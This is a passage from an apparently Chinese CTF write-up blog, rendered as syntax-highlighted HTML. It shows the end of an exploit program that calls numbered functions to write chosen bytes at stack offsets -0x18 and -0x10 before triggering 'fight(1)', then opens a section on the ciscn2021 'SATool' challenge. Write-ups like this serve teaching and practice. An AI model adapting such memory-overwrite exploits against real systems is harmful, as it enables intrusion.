class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun079</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun080</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun081</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun082</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun083</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun084</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun085</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun086</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun087</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun088</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun089</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun090</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun091</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun092</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun093</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun094</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun095</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun096</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun097</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun098</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun099</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun100</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun101</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun102</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun103</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun104</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun105</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun106</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun107</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun108</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun109</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun110</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun111</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun112</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun113</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun114</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun115</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun116</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun117</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun118</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun119</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun120</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun121</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun122</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun123</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun124</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun125</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun126</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun127</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun128</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun129</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun130</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun131</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun132</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun133</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun134</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun135</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun136</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun137</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun138</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun139</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun140</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun141</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun142</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun143</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun144</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun145</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun146</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun147</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun148</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun149</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun150</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun151</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun152</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun153</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun154</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun155</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun156</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun157</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun158</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun159</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun160</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun161</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun162</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun163</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun164</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun165</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun166</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun167</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun168</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun169</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun170</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun171</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun172</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun173</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun174</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun175</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun176</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun177</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun178</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun179</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun180</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun181</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun182</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun183</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun184</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun185</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun186</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun187</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun188</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun189</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun190</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun191</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun192</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun193</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun194</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun195</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun196</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun197</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun198</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun199</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun200</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun201</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun202</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun203</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun204</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun205</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun206</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun207</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun208</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun209</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun210</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun211</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun212</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun213</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun214</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun215</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun216</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun217</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun218</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun219</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun220</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun221</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun222</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun223</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun224</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun225</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun226</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun227</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun228</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun229</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun230</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun231</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// -0x18</span>\n    <span class=\"token function\">fun232</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xad</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun233</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun234</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun235</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun236</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun237</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun238</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun239</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// -0x10</span>\n    <span class=\"token function\">fun240</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun241</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xdf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun242</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x77</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun243</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun244</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun245</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun246</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun247</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun248</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun249</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun250</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun251</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun252</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun253</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun254</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun255</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// -1</span>\n\n    <span class=\"token function\">fun232</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xad</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun233</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun234</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">fun240</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun241</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xdf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fun242</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x77</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h2 id=\"satool\"><a class=\"markdownIt-Anchor\" href=\"#satool\">#</a> SATool</h2>\n<p>来自于 ciscn2021 初赛</p>\n<h3 